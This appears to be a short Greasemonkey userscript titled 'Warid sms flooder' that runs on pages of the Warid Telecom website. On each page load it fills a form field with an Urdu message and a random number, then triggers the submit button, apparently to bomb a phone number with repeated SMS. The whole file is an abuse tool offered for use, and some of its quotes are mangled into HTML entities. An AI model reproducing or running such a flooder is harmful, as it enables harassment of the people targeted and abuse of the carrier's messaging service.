// ==UserScript==

// @name Warid sms flooder

// @description Warid SMS FLOODER/BOMBER

// @include https://www.waridtel.com/cgi-bin/*

// ==/UserScript==

window.addEventListener("load", function(e) {

var i=Math.floor(Math.random()*6346);

document.forms[0].elements[11].value=&#39;Bindass say hamaisha bachnay ko mangtha hay kia. ' + i ;

document.location.href="javascript:document.forms[0].elements[13].click()&quot;;

}, false);
